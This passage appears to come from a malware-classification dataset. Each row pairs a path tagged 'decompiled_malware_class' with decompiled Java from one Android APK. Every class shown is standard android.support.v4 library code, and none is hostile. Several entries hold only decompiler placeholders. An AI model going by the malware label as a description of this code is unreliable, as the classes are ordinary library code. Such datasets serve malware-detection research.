== null) {           throw new IllegalArgumentException(""Failed to find configured root that contains "" + path2);         }         String rootPath2=mostSpecific.getValue().getPath();         if (rootPath2.endsWith(""/"")) {           path=path2.substring(rootPath2.length());         }  else {           path=path2.substring(rootPath2.length() + 1);         }         return new Uri.Builder().scheme(""content"").authority(this.mAuthority).encodedPath(Uri.encode(mostSpecific.getKey()) + '/' + Uri.encode(path,""/"")).build();       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);       }     }     @Override public File getFileForUri(    Uri uri){       String path=uri.getEncodedPath();       int splitIndex=path.indexOf(47,1);       String tag=Uri.decode(path.substring(1,splitIndex));       String path2=Uri.decode(path.substring(splitIndex + 1));       File root=this.mRoots.get(tag);       if (root == null) {         throw new IllegalArgumentException(""Unable to find configured root for "" + uri);       }       File file=new File(root,path2);       try {         File file2=file.getCanonicalFile();         if (!file2.getPath().startsWith(root.getPath())) {           throw new SecurityException(""Resolved path jumped beyond configured root"");         }         return file2;       }  catch (      IOException e) {         throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);       }     }   }   private static int modeToMode(  String mode){     if (""r"".equals(mode)) {       return 268435456;     }     if (""w"".equals(mode) || ""wt"".equals(mode)) {       return 738197504;     }     if (""wa"".equals(mode)) {       return 704643072;     }     if (""rw"".equals(mode)) {       return 939524096;     }     if (""rwt"".equals(mode)) {       return 1006632960;     }     throw new IllegalArgumentException(""Invalid mode: "" + mode);   }   private static File buildPath(  File base,  String... segments){     int len$=segments.length;     int i$=0;     File cur=base;     while (i$ < len$) {       String segment=segments[i$];       i$++;       cur=segment != null ? new File(cur,segment) : cur;     }     return cur;   }   private static String[] copyOf(  String[] original,  int newLength){     String[] result=new String[newLength];     System.arraycopy(original,0,result,0,newLength);     return result;   }   private static Object[] copyOf(  Object[] original,  int newLength){     Object[] result=new Object[newLength];     System.arraycopy(original,0,result,0,newLength);     return result;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\ForceLoadContentObserver.code","public final class ForceLoadContentObserver extends ContentObserver {   public ForceLoadContentObserver(){     super(new Handler());   }   @Override public boolean deliverSelfNotifications(){     return true;   }   @Override public void onChange(  boolean selfChange){     Loader.this.onContentChanged();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\IntentCompat.code","public class IntentCompat {   public static final String ACTION_EXTERNAL_APPLICATIONS_AVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"";   public static final String ACTION_EXTERNAL_APPLICATIONS_UNAVAILABLE=""android.intent.action.EXTERNAL_APPLICATIONS_UNAVAILABLE"";   public static final String EXTRA_CHANGED_PACKAGE_LIST=""android.intent.extra.changed_package_list"";   public static final String EXTRA_CHANGED_UID_LIST=""android.intent.extra.changed_uid_list"";   public static final String EXTRA_HTML_TEXT=""android.intent.extra.HTML_TEXT"";   public static final int FLAG_ACTIVITY_CLEAR_TASK=32768;   public static final int FLAG_ACTIVITY_TASK_ON_HOME=16384;   private static final IntentCompatImpl IMPL; interface IntentCompatImpl {     Intent makeMainActivity(    ComponentName componentName);     Intent makeMainSelectorActivity(    String str,    String str2);     Intent makeRestartActivityTask(    ComponentName componentName);   } static class IntentCompatImplBase implements IntentCompatImpl {     IntentCompatImplBase(){     }     @Override public Intent makeMainActivity(    ComponentName componentName){       Intent intent=new Intent(""android.intent.action.MAIN"");       intent.setComponent(componentName);       intent.addCategory(""android.intent.category.LAUNCHER"");       return intent;     }     @Override public Intent makeMainSelectorActivity(    String selectorAction,    String selectorCategory){       Intent intent=new Intent(selectorAction);       intent.addCategory(selectorCategory);       return intent;     }     @Override public Intent makeRestartActivityTask(    ComponentName mainActivity){       Intent intent=makeMainActivity(mainActivity);       intent.addFlags(268468224);       return intent;     }   } static class IntentCompatImplHC extends IntentCompatImplBase {     IntentCompatImplHC(){     }     @Override public Intent makeMainActivity(    ComponentName componentName){       return IntentCompatHoneycomb.makeMainActivity(componentName);     }     @Override public Intent makeRestartActivityTask(    ComponentName componentName){       return IntentCompatHoneycomb.makeRestartActivityTask(componentName);     }   } static class IntentCompatImplIcsMr1 extends IntentCompatImplHC {     IntentCompatImplIcsMr1(){     }     @Override public Intent makeMainSelectorActivity(    String selectorAction,    String selectorCategory){       return IntentCompatIcsMr1.makeMainSelectorActivity(selectorAction,selectorCategory);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 15) {       IMPL=new IntentCompatImplIcsMr1();     }  else     if (version >= 11) {       IMPL=new IntentCompatImplHC();     }  else {       IMPL=new IntentCompatImplBase();     }   }   private IntentCompat(){   }   public static Intent makeMainActivity(  ComponentName mainActivity){     return IMPL.makeMainActivity(mainActivity);   }   public static Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return IMPL.makeMainSelectorActivity(selectorAction,selectorCategory);   }   public static Intent makeRestartActivityTask(  ComponentName mainActivity){     return IMPL.makeRestartActivityTask(mainActivity);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\IntentCompatHoneycomb.code","class IntentCompatHoneycomb {   IntentCompatHoneycomb(){   }   public static Intent makeMainActivity(  ComponentName mainActivity){     return Intent.makeMainActivity(mainActivity);   }   public static Intent makeRestartActivityTask(  ComponentName mainActivity){     return Intent.makeRestartActivityTask(mainActivity);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\IntentCompatIcsMr1.code","class IntentCompatIcsMr1 {   IntentCompatIcsMr1(){   }   public static Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return Intent.makeMainSelectorActivity(selectorAction,selectorCategory);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\IntentCompatImpl.code","interface IntentCompatImpl {   Intent makeMainActivity(  ComponentName componentName);   Intent makeMainSelectorActivity(  String str,  String str2);   Intent makeRestartActivityTask(  ComponentName componentName); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\IntentCompatImplBase.code","static class IntentCompatImplBase implements IntentCompatImpl {   IntentCompatImplBase(){   }   @Override public Intent makeMainActivity(  ComponentName componentName){     Intent intent=new Intent(""android.intent.action.MAIN"");     intent.setComponent(componentName);     intent.addCategory(""android.intent.category.LAUNCHER"");     return intent;   }   @Override public Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     Intent intent=new Intent(selectorAction);     intent.addCategory(selectorCategory);     return intent;   }   @Override public Intent makeRestartActivityTask(  ComponentName mainActivity){     Intent intent=makeMainActivity(mainActivity);     intent.addFlags(268468224);     return intent;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\IntentCompatImplHC.code","static class IntentCompatImplHC extends IntentCompatImplBase {   IntentCompatImplHC(){   }   @Override public Intent makeMainActivity(  ComponentName componentName){     return IntentCompatHoneycomb.makeMainActivity(componentName);   }   @Override public Intent makeRestartActivityTask(  ComponentName componentName){     return IntentCompatHoneycomb.makeRestartActivityTask(componentName);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\IntentCompatImplIcsMr1.code","static class IntentCompatImplIcsMr1 extends IntentCompatImplHC {   IntentCompatImplIcsMr1(){   }   @Override public Intent makeMainSelectorActivity(  String selectorAction,  String selectorCategory){     return IntentCompatIcsMr1.makeMainSelectorActivity(selectorAction,selectorCategory);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\InternalHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@14aba843"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\Loader.code","public class Loader<D> {   Context mContext;   int mId;   OnLoadCompleteListener<D> mListener;   boolean mStarted=false;   boolean mAbandoned=false;   boolean mReset=true;   boolean mContentChanged=false;   boolean mProcessingChange=false; public interface OnLoadCompleteListener<D> {     void onLoadComplete(    Loader<D> loader,    D d);   } public final class ForceLoadContentObserver extends ContentObserver {     public ForceLoadContentObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       Loader.this.onContentChanged();     }   }   public Loader(  Context context){     this.mContext=context.getApplicationContext();   }   public void deliverResult(  D data){     if (this.mListener != null) {       this.mListener.onLoadComplete(this,data);     }   }   public Context getContext(){     return this.mContext;   }   public int getId(){     return this.mId;   }   public void registerListener(  int id,  OnLoadCompleteListener<D> listener){     if (this.mListener != null) {       throw new IllegalStateException(""There is already a listener registered"");     }     this.mListener=listener;     this.mId=id;   }   public void unregisterListener(  OnLoadCompleteListener<D> listener){     if (this.mListener == null) {       throw new IllegalStateException(""No listener register"");     }     if (this.mListener != listener) {       throw new IllegalArgumentException(""Attempting to unregister the wrong listener"");     }     this.mListener=null;   }   public boolean isStarted(){     return this.mStarted;   }   public boolean isAbandoned(){     return this.mAbandoned;   }   public boolean isReset(){     return this.mReset;   }   public final void startLoading(){     this.mStarted=true;     this.mReset=false;     this.mAbandoned=false;     onStartLoading();   }   protected void onStartLoading(){   }   public void forceLoad(){     onForceLoad();   }   public void onForceLoad(){   }   public void stopLoading(){     this.mStarted=false;     onStopLoading();   }   protected void onStopLoading(){   }   public void abandon(){     this.mAbandoned=true;     onAbandon();   }   protected void onAbandon(){   }   public void reset(){     onReset();     this.mReset=true;     this.mStarted=false;     this.mAbandoned=false;     this.mContentChanged=false;     this.mProcessingChange=false;   }   public void onReset(){   }   public boolean takeContentChanged(){     boolean res=this.mContentChanged;     this.mContentChanged=false;     this.mProcessingChange|=res;     return res;   }   public void commitContentChanged(){     this.mProcessingChange=false;   }   public void rollbackContentChanged(){     if (this.mProcessingChange) {       this.mContentChanged=true;     }   }   public void onContentChanged(){     if (this.mStarted) {       forceLoad();     }  else {       this.mContentChanged=true;     }   }   public String dataToString(  D data){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(data,sb);     sb.append(""}"");     return sb.toString();   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     DebugUtils.buildShortClassTag(this,sb);     sb.append("" id="");     sb.append(this.mId);     sb.append(""}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mListener="");     writer.println(this.mListener);     if (this.mStarted || this.mContentChanged || this.mProcessingChange) {       writer.print(prefix);       writer.print(""mStarted="");       writer.print(this.mStarted);       writer.print("" mContentChanged="");       writer.print(this.mContentChanged);       writer.print("" mProcessingChange="");       writer.println(this.mProcessingChange);     }     if (this.mAbandoned || this.mReset) {       writer.print(prefix);       writer.print(""mAbandoned="");       writer.print(this.mAbandoned);       writer.print("" mReset="");       writer.println(this.mReset);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\LoadTask.code","public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {   private CountDownLatch done=new CountDownLatch(1);   D result;   boolean waiting;   LoadTask(){   }   @Override public D doInBackground(  Void... voidArr){     this.result=(D)AsyncTaskLoader.this.onLoadInBackground();     return this.result;   }   @Override protected void onPostExecute(  D data){     try {       AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);     }   finally {       this.done.countDown();     }   }   @Override protected void onCancelled(){     try {       AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);     }   finally {       this.done.countDown();     }   }   @Override public void run(){     this.waiting=AsyncTaskLoader.DEBUG;     AsyncTaskLoader.this.executePendingTask();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\LocalBroadcastManager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6a419f5f"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\ModernAsyncTask.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3f77ca7b"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\OnLoadCompleteListener.code","public interface OnLoadCompleteListener<D> {   void onLoadComplete(  Loader<D> loader,  D d); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\PathStrategy.code","public interface PathStrategy {   File getFileForUri(  Uri uri);   Uri getUriForFile(  File file); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\ReceiverRecord.code","public static class ReceiverRecord {   boolean broadcasting;   final IntentFilter filter;   final BroadcastReceiver receiver;   ReceiverRecord(  IntentFilter _filter,  BroadcastReceiver _receiver){     this.filter=_filter;     this.receiver=_receiver;   }   public String toString(){     StringBuilder builder=new StringBuilder(128);     builder.append(""Receiver{"");     builder.append(this.receiver);     builder.append("" filter="");     builder.append(this.filter);     builder.append(""}"");     return builder.toString();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\SimplePathStrategy.code","public static class SimplePathStrategy implements PathStrategy {   private final String mAuthority;   private final HashMap<String,File> mRoots=new HashMap<>();   public SimplePathStrategy(  String authority){     this.mAuthority=authority;   }   public void addRoot(  String name,  File root){     if (TextUtils.isEmpty(name)) {       throw new IllegalArgumentException(""Name must not be empty"");     }     try {       this.mRoots.put(name,root.getCanonicalFile());     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + root,e);     }   }   @Override public Uri getUriForFile(  File file){     String path;     try {       String path2=file.getCanonicalPath();       Map.Entry<String,File> mostSpecific=null;       for (      Map.Entry<String,File> root : this.mRoots.entrySet()) {         String rootPath=root.getValue().getPath();         if (path2.startsWith(rootPath) && (mostSpecific == null || rootPath.length() > mostSpecific.getValue().getPath().length())) {           mostSpecific=root;         }       }       if (mostSpecific == null) {         throw new IllegalArgumentException(""Failed to find configured root that contains "" + path2);       }       String rootPath2=mostSpecific.getValue().getPath();       if (rootPath2.endsWith(""/"")) {         path=path2.substring(rootPath2.length());       }  else {         path=path2.substring(rootPath2.length() + 1);       }       return new Uri.Builder().scheme(""content"").authority(this.mAuthority).encodedPath(Uri.encode(mostSpecific.getKey()) + '/' + Uri.encode(path,""/"")).build();     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);     }   }   @Override public File getFileForUri(  Uri uri){     String path=uri.getEncodedPath();     int splitIndex=path.indexOf(47,1);     String tag=Uri.decode(path.substring(1,splitIndex));     String path2=Uri.decode(path.substring(splitIndex + 1));     File root=this.mRoots.get(tag);     if (root == null) {       throw new IllegalArgumentException(""Unable to find configured root for "" + uri);     }     File file=new File(root,path2);     try {       File file2=file.getCanonicalFile();       if (!file2.getPath().startsWith(root.getPath())) {         throw new SecurityException(""Resolved path jumped beyond configured root"");       }       return file2;     }  catch (    IOException e) {       throw new IllegalArgumentException(""Failed to resolve canonical path for "" + file);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\WakefulBroadcastReceiver.code","public abstract class WakefulBroadcastReceiver extends BroadcastReceiver {   private static final String EXTRA_WAKE_LOCK_ID=""android.support.content.wakelockid"";   private static final SparseArray<PowerManager.WakeLock> mActiveWakeLocks=new SparseArray<>();   private static int mNextId=1;   public static ComponentName startWakefulService(  Context context,  Intent intent){     ComponentName comp; synchronized (mActiveWakeLocks) {       int id=mNextId;       mNextId++;       if (mNextId <= 0) {         mNextId=1;       }       intent.putExtra(EXTRA_WAKE_LOCK_ID,id);       comp=context.startService(intent);       if (comp == null) {         comp=null;       }  else {         PowerManager pm=(PowerManager)context.getSystemService(""power"");         PowerManager.WakeLock wl=pm.newWakeLock(1,""wake:"" + comp.flattenToShortString());         wl.setReferenceCounted(false);         wl.acquire(60000L);         mActiveWakeLocks.put(id,wl);       }     }     return comp;   }   public static boolean completeWakefulIntent(  Intent intent){     boolean z=false;     int id=intent.getIntExtra(EXTRA_WAKE_LOCK_ID,0);     if (id != 0) { synchronized (mActiveWakeLocks) {         PowerManager.WakeLock wl=mActiveWakeLocks.get(id);         if (wl != null) {           wl.release();           mActiveWakeLocks.remove(id);           z=true;         }  else {           Log.w(""WakefulBroadcastReceiver"",""No active wake lock id #"" + id);           z=true;         }       }     }     return z;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content\WorkerRunnable.code","public static abstract class WorkerRunnable<Params,Result> implements Callable<Result> {   Params[] mParams;   private WorkerRunnable(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.content.pm\ActivityInfoCompat.code","public class ActivityInfoCompat {   public static final int CONFIG_UI_MODE=512;   private ActivityInfoCompat(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.database\DatabaseUtilsCompat.code","public class DatabaseUtilsCompat {   private DatabaseUtilsCompat(){   }   public static String concatenateWhere(  String a2,  String b){     if (TextUtils.isEmpty(a2)) {       return b;     }     return TextUtils.isEmpty(b) ? a2 : ""("" + a2 + "") AND (""+ b+ "")"";   }   public static String[] appendSelectionArgs(  String[] originalValues,  String[] newValues){     if (originalValues == null || originalValues.length == 0) {       return newValues;     }     String[] result=new String[originalValues.length + newValues.length];     System.arraycopy(originalValues,0,result,0,originalValues.length);     System.arraycopy(newValues,0,result,originalValues.length,newValues.length);     return result;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.graphics.drawable\BaseDrawableImpl.code","static class BaseDrawableImpl implements DrawableImpl {   BaseDrawableImpl(){   }   @Override public void jumpToCurrentState(  Drawable drawable){   }   @Override public void setAutoMirrored(  Drawable drawable,  boolean mirrored){   }   @Override public boolean isAutoMirrored(  Drawable drawable){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.graphics.drawable\DrawableCompat.code","public class DrawableCompat {   static final DrawableImpl IMPL; interface DrawableImpl {     boolean isAutoMirrored(    Drawable drawable);     void jumpToCurrentState(    Drawable drawable);     void setAutoMirrored(    Drawable drawable,    boolean z);   } static class BaseDrawableImpl implements DrawableImpl {     BaseDrawableImpl(){     }     @Override public void jumpToCurrentState(    Drawable drawable){     }     @Override public void setAutoMirrored(    Drawable drawable,    boolean mirrored){     }     @Override public boolean isAutoMirrored(    Drawable drawable){       return false;     }   } static class HoneycombDrawableImpl extends BaseDrawableImpl {     HoneycombDrawableImpl(){     }     @Override public void jumpToCurrentState(    Drawable drawable){       DrawableCompatHoneycomb.jumpToCurrentState(drawable);     }   } static class KitKatDrawableImpl extends HoneycombDrawableImpl {     KitKatDrawableImpl(){     }     @Override public void setAutoMirrored(    Drawable drawable,    boolean mirrored){       DrawableCompatKitKat.setAutoMirrored(drawable,mirrored);     }     @Override public boolean isAutoMirrored(    Drawable drawable){       return DrawableCompatKitKat.isAutoMirrored(drawable);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatDrawableImpl();     }  else     if (version >= 11) {       IMPL=new HoneycombDrawableImpl();     }  else {       IMPL=new BaseDrawableImpl();     }   }   public static void jumpToCurrentState(  Drawable drawable){     IMPL.jumpToCurrentState(drawable);   }   public static void setAutoMirrored(  Drawable drawable,  boolean mirrored){     IMPL.setAutoMirrored(drawable,mirrored);   }   public static boolean isAutoMirrored(  Drawable drawable){     return IMPL.isAutoMirrored(drawable);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.graphics.drawable\DrawableCompatHoneycomb.code","class DrawableCompatHoneycomb {   DrawableCompatHoneycomb(){   }   public static void jumpToCurrentState(  Drawable drawable){     drawable.jumpToCurrentState();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.graphics.drawable\DrawableCompatKitKat.code","class DrawableCompatKitKat {   DrawableCompatKitKat(){   }   public static void setAutoMirrored(  Drawable drawable,  boolean mirrored){     drawable.setAutoMirrored(mirrored);   }   public static boolean isAutoMirrored(  Drawable drawable){     return drawable.isAutoMirrored();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.graphics.drawable\DrawableImpl.code","interface DrawableImpl {   boolean isAutoMirrored(  Drawable drawable);   void jumpToCurrentState(  Drawable drawable);   void setAutoMirrored(  Drawable drawable,  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.graphics.drawable\HoneycombDrawableImpl.code","static class HoneycombDrawableImpl extends BaseDrawableImpl {   HoneycombDrawableImpl(){   }   @Override public void jumpToCurrentState(  Drawable drawable){     DrawableCompatHoneycomb.jumpToCurrentState(drawable);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.graphics.drawable\KitKatDrawableImpl.code","static class KitKatDrawableImpl extends HoneycombDrawableImpl {   KitKatDrawableImpl(){   }   @Override public void setAutoMirrored(  Drawable drawable,  boolean mirrored){     DrawableCompatKitKat.setAutoMirrored(drawable,mirrored);   }   @Override public boolean isAutoMirrored(  Drawable drawable){     return DrawableCompatKitKat.isAutoMirrored(drawable);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.hardware.display\DisplayManagerCompat.code","public abstract class DisplayManagerCompat {   public static final String DISPLAY_CATEGORY_PRESENTATION=""android.hardware.display.category.PRESENTATION"";   private static final WeakHashMap<Context,DisplayManagerCompat> sInstances=new WeakHashMap<>();   public abstract Display getDisplay(  int i);   public abstract Display[] getDisplays();   public abstract Display[] getDisplays(  String str);   DisplayManagerCompat(){   }   public static DisplayManagerCompat getInstance(  Context context){     DisplayManagerCompat instance; synchronized (sInstances) {       instance=sInstances.get(context);       if (instance == null) {         int version=Build.VERSION.SDK_INT;         if (version >= 17) {           instance=new JellybeanMr1Impl(context);         }  else {           instance=new LegacyImpl(context);         }         sInstances.put(context,instance);       }     }     return instance;   } private static class LegacyImpl extends DisplayManagerCompat {     private final WindowManager mWindowManager;     public LegacyImpl(    Context context){       this.mWindowManager=(WindowManager)context.getSystemService(""window"");     }     @Override public Display getDisplay(    int displayId){       Display display=this.mWindowManager.getDefaultDisplay();       if (display.getDisplayId() == displayId) {         return display;       }       return null;     }     @Override public Display[] getDisplays(){       return new Display[]{this.mWindowManager.getDefaultDisplay()};     }     @Override public Display[] getDisplays(    String category){       return category == null ? getDisplays() : new Display[0];     }   } private static class JellybeanMr1Impl extends DisplayManagerCompat {     private final Object mDisplayManagerObj;     public JellybeanMr1Impl(    Context context){       this.mDisplayManagerObj=DisplayManagerJellybeanMr1.getDisplayManager(context);     }     @Override public Display getDisplay(    int displayId){       return DisplayManagerJellybeanMr1.getDisplay(this.mDisplayManagerObj,displayId);     }     @Override public Display[] getDisplays(){       return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj);     }     @Override public Display[] getDisplays(    String category){       return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj,category);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.hardware.display\DisplayManagerJellybeanMr1.code","final class DisplayManagerJellybeanMr1 {   DisplayManagerJellybeanMr1(){   }   public static Object getDisplayManager(  Context context){     return context.getSystemService(""display"");   }   public static Display getDisplay(  Object displayManagerObj,  int displayId){     return ((DisplayManager)displayManagerObj).getDisplay(displayId);   }   public static Display[] getDisplays(  Object displayManagerObj){     return ((DisplayManager)displayManagerObj).getDisplays();   }   public static Display[] getDisplays(  Object displayManagerObj,  String category){     return ((DisplayManager)displayManagerObj).getDisplays(category);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.hardware.display\JellybeanMr1Impl.code","private static class JellybeanMr1Impl extends DisplayManagerCompat {   private final Object mDisplayManagerObj;   public JellybeanMr1Impl(  Context context){     this.mDisplayManagerObj=DisplayManagerJellybeanMr1.getDisplayManager(context);   }   @Override public Display getDisplay(  int displayId){     return DisplayManagerJellybeanMr1.getDisplay(this.mDisplayManagerObj,displayId);   }   @Override public Display[] getDisplays(){     return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj);   }   @Override public Display[] getDisplays(  String category){     return DisplayManagerJellybeanMr1.getDisplays(this.mDisplayManagerObj,category);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.hardware.display\LegacyImpl.code","private static class LegacyImpl extends DisplayManagerCompat {   private final WindowManager mWindowManager;   public LegacyImpl(  Context context){     this.mWindowManager=(WindowManager)context.getSystemService(""window"");   }   @Override public Display getDisplay(  int displayId){     Display display=this.mWindowManager.getDefaultDisplay();     if (display.getDisplayId() == displayId) {       return display;     }     return null;   }   @Override public Display[] getDisplays(){     return new Display[]{this.mWindowManager.getDefaultDisplay()};   }   @Override public Display[] getDisplays(  String category){     return category == null ? getDisplays() : new Display[0];   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.internal.view\SupportMenu.code","public interface SupportMenu extends Menu {   public static final int CATEGORY_MASK=-65536;   public static final int CATEGORY_SHIFT=16;   public static final int USER_MASK=65535;   public static final int USER_SHIFT=0; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.internal.view\SupportMenuItem.code","public interface SupportMenuItem extends MenuItem {   public static final int SHOW_AS_ACTION_ALWAYS=2;   public static final int SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW=8;   public static final int SHOW_AS_ACTION_IF_ROOM=1;   public static final int SHOW_AS_ACTION_NEVER=0;   public static final int SHOW_AS_ACTION_WITH_TEXT=4;   @Override boolean collapseActionView();   @Override boolean expandActionView();   @Override View getActionView();   ActionProvider getSupportActionProvider();   @Override boolean isActionViewExpanded();   @Override MenuItem setActionView(  int i);   @Override MenuItem setActionView(  View view);   @Override void setShowAsAction(  int i);   @Override MenuItem setShowAsActionFlags(  int i);   SupportMenuItem setSupportActionProvider(  ActionProvider actionProvider);   SupportMenuItem setSupportOnActionExpandListener(  MenuItemCompat.OnActionExpandListener onActionExpandListener); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.internal.view\SupportSubMenu.code","public interface SupportSubMenu extends SupportMenu, SubMenu { } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.media\TransportController.code","public abstract class TransportController {   public abstract int getBufferPercentage();   public abstract long getCurrentPosition();   public abstract long getDuration();   public abstract int getTransportControlFlags();   public abstract boolean isPlaying();   public abstract void pausePlaying();   public abstract void registerStateListener(  TransportStateListener transportStateListener);   public abstract void seekTo(  long j);   public abstract void startPlaying();   public abstract void stopPlaying();   public abstract void unregisterStateListener(  TransportStateListener transportStateListener); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.media\TransportMediator.code","!org.eclipse.jdt.core.dom.TypeDeclaration@48ab4c59"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.media\TransportMediatorCallback.code","interface TransportMediatorCallback {   long getPlaybackPosition();   void handleAudioFocusChange(  int i);   void handleKey(  KeyEvent keyEvent);   void playbackPositionUpdate(  long j); } "
